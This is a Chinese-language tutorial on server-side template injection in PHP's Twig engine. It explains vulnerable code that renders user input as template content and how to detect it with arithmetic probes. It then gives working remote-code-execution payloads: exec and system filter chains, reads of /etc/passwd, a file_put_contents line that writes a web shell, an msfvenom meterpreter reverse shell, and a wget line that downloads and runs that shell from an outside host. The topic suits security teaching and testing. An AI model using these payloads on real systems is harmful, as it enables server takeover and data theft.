# PHP-Twig 模板注入

Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。

```php
<?php
　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig = new Twig_Environment(new Twig_Loader_String());
　　$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
　　echo $output;
?>
```

Twig 使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。

其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。

使用 Twig 模版引擎渲染页面，其中模版含有 {{name}}  变量，其模版变量值来自于 GET 请求参数$_GET["name"] 。

显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击：
但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：

```php
<?php
　　require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig=newTwig_Environment(newTwig_Loader_String());
　　$output=$twig->render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分
　　echo $output;?>
```

上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：
如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。

在 Twig 模板引擎里，`{{var}}` 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。

例如这里用户输入 name=`{{2*10}} ，则在服务端拼接的模版内容为：
尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为：
bmjoker{# comment #}{{2*8}}OK
实际服务端要进行编译的模板就被构造为：
bmjoker{# comment #}{{2*8}}OK
由于 {# comment #}  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK

通过上面两个简单的示例，就能得到 SSTI 扫描检测的大致流程（这里以 Twig 为例）:

同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。

每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。

简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。

凡是使用模板的网站，基本都会存在 SSTI，只是能否控制其传参而已。

接下来借助 XVWA 的代码来实践演示一下 SSTI 注入

如果在 web 页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据

<div>{$what}</div>
<p>Welcome, {{username}}</p>
<div>{%$a%}</div>
...
通过注入了探测字符串 ${{123+456}}，以查看应用程序是否进行了相应的计算：

根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式

在这里提供一个针对 twig 的攻击载荷：

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

使用 msf 生成了一个 php meterpreter 有效载荷

msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 > /var/www/html/shell.txt
msf 进行监听：

模板注入远程下载 shell，并重命名运行

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("wget <http://192.168.127.131/shell.txt> -O /tmp/shell.php;php -f /tmp/shell.php")}}

以上就是 php twig 模板注入，由于以上使用的 twig 为 2.x 版本，现在官方已经更新到 3.x 版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload：

{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}

{{app.request.files.get(1).openFile.fread(99)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

{{["id"]|map("system")|join(",")

{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

{{["id",0]|sort("system")|join(",")}}

{{["id"]|filter("system")|join(",")}}

{{[0,0]|reduce("system","id")|join(",")}}

{{['cat /etc/passwd']|filter('system')}}
具体 payload 分析详见：《TWIG 全版本通用 SSTI payloads》

　　　　　　　　　　  《SSTI-服务器端模板注入》
